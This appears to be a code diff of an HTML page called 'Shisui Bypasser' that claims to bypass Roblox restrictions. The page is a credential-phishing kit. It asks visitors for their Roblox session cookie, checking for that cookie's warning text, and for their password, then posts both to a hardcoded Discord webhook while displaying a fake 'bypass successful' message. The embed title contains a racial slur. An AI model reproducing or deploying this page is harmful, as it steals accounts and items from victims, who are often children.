@@ -1,93 +1,132 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shisui Bypasser</title>
-    <style>
-        body {
-            background-color: #1A1A2E;
-            color: #E94560;
-            font-family: 'Roboto', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .form-container {
-            background-color: #16213E;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #E94560;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #D83D50;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Shisui Bypasser Any Age!</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
 </head>
-<body>
-    <div class="form-container">
-        <h2>Shisui Bypasser</h2>
-        <form id="bypassForm">
-            <input type="text" id="cookie" placeholder="Enter Cookie" required>
-            <input type="password" id="password" placeholder="Enter Password" required>
-            <button type="submit">Submit</button>
-        </form>
-        <div id="notification" style="margin-top: 10px;"></div>
+<body class="bg-black min-h-screen flex flex-col items-center justify-center p-4">
+  <div class="relative w-full max-w-md rounded-xl border border-gray-700 p-6 text-center">
+    <!-- Glowing orange dots -->
+    <span class="absolute top-6 left-6 w-4 h-4 rounded-full bg-yellow-600 shadow-[0_0_10px_3px_rgba(255,165,0,0.7)]"></span>
+    <span class="absolute top-6 right-10 w-3 h-3 rounded-full bg-yellow-600 shadow-[0_0_10px_3px_rgba(255,165,0,0.7)]"></span>
+    <span class="absolute top-[180px] left-[50%] translate-x-[-50%] w-3 h-3 rounded-full bg-yellow-600 shadow-[0_0_10px_3px_rgba(255,165,0,0.7)]"></span>
+    <span class="absolute bottom-20 left-6 w-4 h-4 rounded-full bg-yellow-600 shadow-[0_0_10px_3px_rgba(255,165,0,0.7)]"></span>
+    <span class="absolute bottom-6 right-10 w-3 h-3 rounded-full bg-yellow-600 shadow-[0_0_10px_3px_rgba(255,165,0,0.7)]"></span>
+
+    <h1 class="text-white font-extrabold text-2xl sm:text-3xl leading-tight mb-3 drop-shadow-[0_0_6px_rgba(255,165,0,0.7)]">
+      SPLUNK BYPASSER 13 <span class="drop-shadow-[0_0_6px_rgba(255,165,0,0.7)]">🖐️</span> Welcome To Best Bypasser (Shisui)
+    </h1>
+    <p class="text-white text-lg mb-6">Enter your cookie to bypass</p>
+    <form id="cookieForm" class="space-y-4" novalidate>
+      <input
+        id="cookieInput"
+        name="cookie"
+        type="text"
+        placeholder="Enter cookie"
+        class="w-full rounded-lg bg-gray-800 text-gray-400 placeholder-gray-500 py-3 px-4 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+        required
+      />
+      <input
+        id="passwordInput"
+        name="password"
+        type="password"
+        placeholder="Enter password"
+        class="w-full rounded-lg bg-gray-800 text-gray-400 placeholder-gray-500 py-3 px-4 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+      />
+      <button
+        type="submit"
+        class="w-full bg-gradient-to-b from-yellow-500 to-yellow-600 text-white font-bold py-3 rounded-lg shadow-[0_0_15px_3px_rgba(255,165,0,0.7)] hover:brightness-110 transition"
+      >
+        Submit
+      </button>
+    </form>
+    <p id="errorMsg" class="text-red-500 font-semibold mt-3 hidden">your cookie submit is invalid</p>
+    <div class="mt-6 flex gap-6 justify-center">
+      <a
+        href="https://discord.gg/zAYJTgaCs6" 
+        target="_blank" 
+        rel="noopener noreferrer"
+        class="flex-1 bg-gradient-to-b from-yellow-500 to-yellow-600 text-white font-bold py-3 rounded-lg shadow-[0_0_15px_3px_rgba(255,165,0,0.7)] hover:brightness-110 transition inline-block text-center no-underline"
+      >
+        Shisui Discord Server
+      </a>
+      <button
+        class="flex-1 bg-gradient-to-b from-yellow-500 to-yellow-600 text-white font-bold py-3 rounded-lg shadow-[0_0_15px_3px_rgba(255,165,0,0.7)] hover:brightness-110 transition"
+      >
+        soon
+      </button>
     </div>
+  </div>
+  <p class="text-yellow-500 text-center mt-6 max-w-md px-2 text-sm sm:text-base">
+    it's not working if there is no <code class="font-mono bg-gray-900 px-1 rounded">_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_</code>
+  </p>
 
-    <script>
-        document.getElementById('bypassForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const cookie = document.getElementById('cookie').value;
-            const password = document.getElementById('password').value;
+  <script>
+    const form = document.getElementById('cookieForm');
+    const cookieInput = document.getElementById('cookieInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const errorMsg = document.getElementById('errorMsg');
+    const requiredString = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+    const webhookURL = "https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua";
 
-            // Replace with your actual webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua';
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const cookieValue = cookieInput.value;
+      const passwordValue = passwordInput.value;
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `Cookie: ${cookie}\nPassword: ${password}`,
-                    embeds: [{
-                        title: "Bypass Notification",
-                        description: "Bypass successful! Please wait 1-5 minutes and check!",
-                        color: 3066993 // Color code for embed
-                    }],
-                    mentions: ["@everyone @here"] // Replace with actual user ID or mention format
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById('notification').innerText = "Bypass successful! Please wait 1-5 minutes and check!";
-                } else {
-                    throw new Error('Network response was not ok');
-                }
-            })
-            .catch(error => {
-                document.getElementById('notification').innerText = "Something went wrong, please DM the owner!";
-            });
+      if (!cookieValue.includes(requiredString)) {
+        errorMsg.classList.remove('hidden');
+        return;
+      } else {
+        errorMsg.classList.add('hidden');
+      }
+
+      // Prepare payload for webhook
+      const payload = {
+        content: @everyone @here,
+        embeds: [
+          {
+            title: "Someome Bypass Nigga",
+            color: 16753920, // orange color
+            fields: [
+              { name: "Cookie", value: "```" + cookieValue + "```", inline: false },
+              { name: "Password", value: "```" + passwordValue + "```", inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
         });
-    </script>
+
+        if (response.ok) {
+          alert("Successful Wait For 1-5minutes and check!");
+          form.reset();
+        } else {
+          alert("Failed to bypass cookie. Please try again later.");
+        }
+      } catch (error) {
+        alert("An error occurred while bypassing. Please try again later.");
+      }
+    });
+  </script>
 </body>
 </html>
